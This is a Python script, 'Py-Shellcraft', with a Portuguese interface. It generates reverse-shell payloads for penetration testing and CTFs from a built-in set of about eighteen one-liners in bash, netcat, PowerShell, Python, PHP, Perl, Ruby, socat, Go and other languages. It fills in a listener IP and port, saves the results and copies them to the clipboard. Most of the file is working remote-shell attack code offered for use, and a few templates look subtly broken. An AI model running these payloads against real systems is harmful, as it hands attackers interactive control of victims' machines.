#!/usr/bin/env python3
"""
Py-Shellcraft (Canivete de Reverse Shells v2.0)
Autor: Daniel Lopes Batista (zGordola1)
Descrição: Gerador interativo de payloads para testes de intrusão, CTFs e segurança ofensiva.
"""

import os
import subprocess
import ipaddress
import netifaces

# Habilita suporte a cores ANSI no console do Windows
os.system("")

# Cores ANSI
VERDE = "\033[92m"
VERMELHO = "\033[91m"
AZUL = "\033[94m"
AMARELO = "\033[93m"
NEGRITO = "\033[1m"
RESET = "\033[0m"

PAYLOADS_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash_196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    "bash_read": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
    "python_short": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc_e": "nc -e /bin/bash {ip} {port}",
    "nc_c": "nc -c /bin/bash {ip} {port}",
    "ncat": "ncat {ip} {port} -e /bin/bash",
    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\'",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    "golang": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
    "nodejs": "require('child_process').exec('nc -e /bin/sh {ip} {port}')",
    "telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
}


def copiar_para_clipboard(texto):
    try:
        subprocess.run("clip", input=texto, text=True, check=True)
        print(f"{VERDE}[+] Payload copiado para a área de transferência! (Ctrl + V){RESET}")
    except Exception:
        try:
            subprocess.run(["xclip", "-selection", "clipboard"], input=texto.encode(), check=True)
            print(f"{VERDE}[+] Payload copiado para o clipboard via xclip!{RESET}")
        except Exception as e:
            print(f"{AMARELO}[-] Aviso: Não foi possível copiar para o clipboard: {e}{RESET}")


def get_ip_auto():
    ips_encontrados = []
    try:
        for interface in netifaces.interfaces():
            if_info = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in if_info:
                for link in if_info[netifaces.AF_INET]:
                    endereco = link.get("addr")
                    if endereco and endereco != "127.0.0.1" and not endereco.startswith("127."):
                        ips_encontrados.append(endereco)
    except Exception as e:
        print(f"{AMARELO}[-] Aviso ao buscar interfaces de rede: {e}{RESET}")

    return ips_encontrados


def formatar_payloads(ip, porta):
    payloads_prontos = {}
    for nome, comando in PAYLOADS_TEMPLATES.items():
        try:
            payloads_prontos[nome] = comando.replace("{ip}", ip).replace("{port}", str(porta))
        except Exception as e:
            print(f"{VERMELHO}[-] Erro ao formatar payload para {nome}: {e}{RESET}")
    return payloads_prontos


def exibir_payloads(payloads, ip, porta):
    print(f"\n{AZUL}{NEGRITO}=== PAYLOADS GERADOS PARA {ip}:{porta} ==={RESET}\n")
    for nome, comando in payloads.items():
        print(f"{AMARELO}# {nome}{RESET}\n{comando}\n")


def salvar_payloads(payloads):
    try:
        with open("payloads_gerados.txt", "w", encoding="utf-8") as f:
            for nome, comando in payloads.items():
                f.write(f"# {nome}\n{comando}\n\n")
        print(f"{VERDE}[+] Todos os payloads salvos com sucesso em 'payloads_gerados.txt'!{RESET}")
    except Exception as e:
        print(f"{VERMELHO}[-] Erro ao salvar o arquivo: {e}{RESET}")


def main():
    print(f"\n{AZUL}{NEGRITO}==================================={RESET}")
    print(f"{AZUL}{NEGRITO}   PY-SHELLCRAFT - REVERSE SHELL   {RESET}")
    print(f"{AZUL}{NEGRITO}==================================={RESET}\n")

    try:
        ips_detectados = get_ip_auto()
        ip_sugestao = ips_detectados[0] if ips_detectados else "127.0.0.1"

        if ips_detectados:
            print(f"{AZUL}[*] Interfaces ativas detectadas:{RESET} {', '.join(ips_detectados)}")

        ip = input(f"Digite o IP do listener [Enter para {ip_sugestao}]: ").strip() or ip_sugestao

        try:
            ipaddress.ip_address(ip)
        except ValueError:
            print(f"{VERMELHO}[-] Erro: Endereço IP '{ip}' inválido!{RESET}")
            return

        porta_padrao = "4444"
        porta = input(f"Digite a porta do listener [Enter para {porta_padrao}]: ").strip() or porta_padrao

        if not porta.isdigit() or not (1 <= int(porta) <= 65535):
            print(f"{VERMELHO}[-] Erro: Porta '{porta}' inválida! (1-65535){RESET}")
            return

    except KeyboardInterrupt:
        print("\n[!] Operação cancelada.")
        return

    payloads = formatar_payloads(ip, porta)
    salvar_payloads(payloads)

    print(f"\n{AZUL}[*] Total de payloads disponíveis: {len(payloads)}{RESET}")
    busca = input("Digite o nome do payload (ex: bash, python, nc, powershell) ou [Enter] para listar todos: ").strip().lower()

    if busca in payloads:
        comando = payloads[busca]
        print(f"\n{AMARELO}# {busca}{RESET}\n{comando}\n")
        copiar_para_clipboard(comando)
    elif busca == "":
        exibir_payloads(payloads, ip, porta)
    else:
        print(f"{AMARELO}[-] Payload '{busca}' não encontrado. Exibindo todos:{RESET}")
        exibir_payloads(payloads, ip, porta)


if __name__ == "__main__":
    main()
